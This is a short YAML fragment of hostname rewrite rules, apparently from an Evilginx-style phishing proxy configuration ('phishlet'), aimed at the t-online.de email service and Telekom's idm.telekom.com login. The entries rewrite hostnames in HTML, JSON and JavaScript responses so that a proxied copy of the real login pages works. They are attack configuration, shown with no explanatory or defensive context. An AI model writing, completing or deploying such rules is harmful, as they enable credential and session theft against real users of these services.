  - {triggers_on: "email.t-online.de", orig_sub: "email", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "email.t-online.de", orig_sub: "email", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "email.t-online.de", orig_sub: "accounts.login", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
